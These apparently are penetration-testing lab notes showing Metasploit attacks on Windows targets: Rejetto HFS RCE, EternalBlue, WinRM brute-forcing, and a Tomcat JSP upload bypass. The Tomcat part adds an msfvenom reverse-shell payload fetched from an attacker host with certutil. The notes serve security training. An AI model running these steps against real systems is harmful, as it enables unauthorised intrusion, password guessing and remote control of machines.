# Exploiting Windows

## Exploiting a Vulnerable HTTP File Server (HFS)

### Overview

- **HTTP File Server (HFS)**: A web server designed for file and document sharing.
- **Communication**: Typically runs on **TCP port 80** and uses the **HTTP protocol**.
- **Rejetto HFS**: A free, open-source HTTP file server for both **Windows** and **Linux**.
- **Vulnerability**: Version 2.3 of Rejetto HFS is vulnerable to **Remote Code Execution (RCE)**.
- **Exploit Module**: Metasploit (MSF) provides an exploit module to target this vulnerability and gain access to the system running HFS.

### Demo: Exploiting a Vulnerable HTTP File Server

Start the Metasploit service and PostgreSQL database:

```bash
service postgresql start && msfconsole
```

Verify the database connection:

```bash
db_status
```

Create a new workspace for organizing the attack:

```bash
workspace -a HFS
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

We perform an Nmap scan, identifying open ports, services, and the operating system. The scan results are stored directly in the Metasploit database:

```bash
db_nmap -sS -sV -O [targetIP]
```

We search for the **Rejetto HFS** exploit module in Metasploit:

```bash
search type:exploit name:rejetto
```

We use the exploit module for the Rejetto HFS vulnerability:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Display the options available for this exploit to ensure proper configuration:

```bash
show options
```

Retrieve detailed information about the exploit module:

```bash
info
```

Run the exploit to execute the attack and gain access to the target system:

```bash
run
```

### Post-Exploitation: Meterpreter Session

After a successful exploit, interact with the target system through a Meterpreter session.

Open a shell on the compromised system:

```bash
shell
```

Navigate to the root directory:

```bash
cd /
```

List the contents of the current directory:

```bash
dir
```

Read the content of the flag file:

```bash
type flag.txt
```

### Conclusion

Using Metasploit, we successfully exploited the vulnerable HTTP File Server running on the target system by leveraging the **Rejetto HFS Remote Code Execution exploit**.

# Exploiting Windows MS17-010 SMB Vulnerability

## MS17-010 EternalBlue Exploit

### Overview

- **EternalBlue (MS17-010/CVE-2017-0144)**: A collection of Windows vulnerabilities that allow attackers to remotely execute arbitrary code and gain access to a Windows system and potentially the entire network.
- **Vulnerability**: Exploits a flaw in the **Windows SMBv1 protocol**, allowing specially crafted packets to execute arbitrary commands on the target system.
- **Affected Windows Versions**:
  - Windows Vista, 7, Server 2008, 8.1, Server 2012, 10, Server 2016
- **EternalBlue in Metasploit**:
  - **Auxiliary Module**: Scans systems to check if they are vulnerable to the MS17-010 exploit.
  - **Exploit Module**: Exploits the vulnerability on unpatched systems, providing a privileged Meterpreter session on the target.

## Demo: Exploiting Windows MS17-010 SMB Vulnerability

Start the Metasploit console:

```bash
msfconsole
```

Create a new workspace for the EternalBlue attack:

```bash
workspace -a EternalBlue
```

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

### Step 1: Check if Target is Vulnerable

Search for the **EternalBlue auxiliary scanner** in Metasploit:

```bash
search type:auxiliary name:eternalblue
```

Use the auxiliary module to check if the target is vulnerable:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Show available options for the module:

```bash
show options
```

Set the target IP address:

```bash
set rhosts [targetIP]
```

Run the scanner to check for vulnerability:

```bash
run
```

If the target is vulnerable, the scan will confirm this.

### Step 2: Exploiting the Vulnerability

Search for the **EternalBlue exploit** in Metasploit:

```bash
search type:exploit name:eternalblue
```

Use the exploit module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Show the available options for the exploit:

```bash
show options
```

Set the target IP:

```bash
set rhosts [targetIP]
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Meterpreter Session

Once the exploit is successful, we will have a **Meterpreter session**. We can now interact with the target system.

Get system information:

```bash
sysinfo
```

Check the user privileges:

```bash
getuid
```

If successful, we will have access to the system as **NT AUTHORITY/SYSTEM**.

### Conclusion

Using the **EternalBlue exploit** in Metasploit, we successfully exploited the **MS17-010 SMB vulnerability** on the target system, gaining privileged access via a Meterpreter session.

# Exploiting WinRM

## Overview

- **Windows Remote Management (WinRM)** is a Windows protocol used to facilitate remote access to Windows systems.
- **Use Cases**:
  - Remotely access and interact with Windows hosts on a local network.
  - Execute commands remotely on Windows systems over the internet.
  - Manage and configure Windows systems from a remote location.
- **Ports**: WinRM typically runs on **TCP port 5985** for HTTP and **5986** for HTTPS.
- **Security**: WinRM enforces access control and secure communication through various authentication methods.
- **Metasploit Integration**: We can use Metasploit to identify WinRM users and passwords, execute commands, and obtain a **Meterpreter session** on the target system.

## Demo: Exploiting WinRM (Windows Remote Management Protocol)

Our goal is to exploit the **Windows Remote Management (WinRM)** service on the target system. We will begin by scanning and identifying the open WinRM port, followed by checking the available authentication methods. If we identify valid credentials, we will attempt a brute-force attack to obtain access. Afterward, we will execute commands on the target using WinRM and, finally, use a Metasploit exploit to gain a **Meterpreter session** for full system access.

Start the Metasploit console and PostgreSQL service:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the WinRM attack:

```bash
workspace -a WinRM
```

Perform an Nmap scan to identify open ports and services on the target:

```bash
db_nmap -sS -sV -O -p- [targetIP]
```

View the services discovered during the scan:

```bash
services
```

We observe that **WinRM** is running on **port 5985**.

### Check Authentication Methods

We search for auxiliary modules related to WinRM to check which authentication methods are supported:

```bash
search auxiliary name:winrm
```

Use the **WinRM authentication methods scanner**:

```bash
use auxiliary/scanner/winrm/winrm_auth_methods
```

Show the available options:

```bash
show options
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

Run the scanner:

```bash
run
```

### Performing Brute-Force on WinRM

We search for a module to perform brute-force attacks on WinRM:

```bash
search winrm_login
```

Use the **WinRM login** scanner module:

```bash
use auxiliary/scanner/winrm/winrm_login
```

Show the available options:

```bash
show options
```

Since we don't have credentials, we specify files for usernames and passwords:

```bash
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Run the brute-force attack:

```bash
run
```

### Test Credentials with WinRM Command Module

We test the obtained credentials using the **winrm_cmd** module:

```bash
use auxiliary/scanner/winrm/winrm_cmd
```

Set the discovered username and password:

```bash
set USERNAME administrator
set PASSWORD tinkerbell
```

Set the command to execute (`whoami` in this case):

```bash
set CMD whoami
```

Run the command:

```bash
run
```

### Executing Meterpreter Session via WinRM

We execute a **Meterpreter session** using the **winrm_script_exec** exploit:

```bash
use exploit/windows/winrm/winrm_script_exec
```

Set the username and password:

```bash
set USERNAME administrator
set PASSWORD tinkerbell
```

Force the use of **VBS** for execution:

```bash
set FORCE_VBS true
```

Run the exploit, and we successfully obtain a **Meterpreter session**.

### Post-Exploitation

We can now interact with the compromised system using Meterpreter:

- Retrieve system information:

    ```bash
    sysinfo
    ```

- Get the current user ID:

    ```bash
    getuid
    ```

### Conclusion

We successfully exploited WinRM using Metasploit, identified the correct authentication method, performed a brute-force attack to retrieve credentials, and executed commands on the target system. Finally, we obtained a Meterpreter session for further post-exploitation actions.

# Exploiting a Vulnerable Apache Tomcat Web Server

## Apache Tomcat Web Server

### Overview

- **Apache Tomcat**: A popular, free, and open-source Java servlet web server.
- **Purpose**: Used to build and host dynamic websites and web applications based on the Java platform.
- **Communication**: Utilizes the **HTTP protocol** to facilitate communication between servers and clients.
- **Default Port**: Apache Tomcat typically runs on **TCP port 8080**.
- **Comparison with Apache HTTP Server**:
  - **Apache HTTP Server**: Hosts static and dynamic websites, often developed in PHP.
  - **Apache Tomcat**: Primarily hosts dynamic websites or applications developed in Java.
- **Vulnerability**: Apache Tomcat **V8.5.19** is vulnerable to **Remote Code Execution (RCE)**, allowing attackers to upload and execute JSP payloads to gain remote access.
- **Metasploit Integration**: We can use a prebuilt Metasploit exploit module to exploit this vulnerability and gain access to the target server.

## Demo: Exploiting a Vulnerable Apache Tomcat Web Server

### Plan

Our goal is to exploit the **Apache Tomcat V8.5.19** vulnerability to gain remote access. We will perform reconnaissance using Metasploit and identify the Tomcat server, then exploit it by uploading a JSP payload. Finally, we will transfer a Meterpreter payload to the target system to establish a full Meterpreter session for post-exploitation.

### Step-by-Step Process

Start Metasploit and PostgreSQL:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Tomcat attack:

```bash
workspace -a tomcat
```

Set the target IP globally:

```bash
setg rhosts [targetIP]
```

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

Check the services discovered during the scan:

```bash
services
```

We see that the target runs **Windows** and **Apache Tomcat V8.5.19**.

### Exploiting Apache Tomcat

Search for an exploit module for Tomcat:

```bash
search type:exploit name:tomcat_jsp
```

Use the **Tomcat JSP upload bypass** exploit:

```bash
use exploit/multi/http/tomcat_jsp_upload_bypass
```

Show the available options:

```bash
show options
```

Confirm that Tomcat is running by visiting the target’s **port 8080** in a web browser.

Set the payload:

```bash
set payload java/jsp_shell_bind_tcp
```

Display the options for the configured payload:

```bash
show options
```

Set the shell type to **cmd**:

```bash
set SHELL cmd
```

Run the exploit (it might require a few tries):

```bash
run
```

Once we gain a session, we put it in the background with **CTRL + Z**:

```bash
sessions
```

### Uploading Meterpreter Payload

We generate a **Windows Meterpreter payload** using Msfvenom and upload it to the target system via the cmd shell.

Open a new terminal tab:

Generate the payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=1234 -f exe > meterpreter.exe
```

List the payload to ensure it was created:

```bash
ls
```

Set up a simple web server to host the payload:

```bash
sudo python -m SimpleHTTPServer 80
```

Switch back to the first tab (cmd shell session):

```bash
sessions 1
```

Download the Meterpreter payload onto the target system using **certutil**:

```bash
certutil -urlcache -f http://[webserverIP]/meterpreter.exe meterpreter.exe
```

Verify the file is downloaded:

```bash
dir
```

### Setting up the Handler

We need to set up a handler to receive the connection once we execute the payload on the target system.

Create a resource script for the handler:

```bash
vim handler.rc
```

Inside the `handler.rc` script:

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ownIP]
set LPORT 1234
run
:wq
```

Load the resource script to automatically set up the listener:

```bash
msfconsole -r handler.rc
```

### Executing the Payload

We execute the Meterpreter payload on the target. Switch back to the first tab:

```bash
.\meterpreter.exe
```

In the second tab (where the listener is running), we see that a **Meterpreter session** has opened.

### Post-Exploitation

Check system information:

```bash
sysinfo
```

Get the current user ID:

```bash
getuid
```

### Conclusion

What we accomplished:
- Exploited a vulnerable **Apache Tomcat web server**.
- Generated a **Meterpreter payload** and transferred it to the target system.
- Set up a **handler** to listen for incoming connections.
- Executed the payload on the target system.
- Established a **Meterpreter session** for further post-exploitation actions.






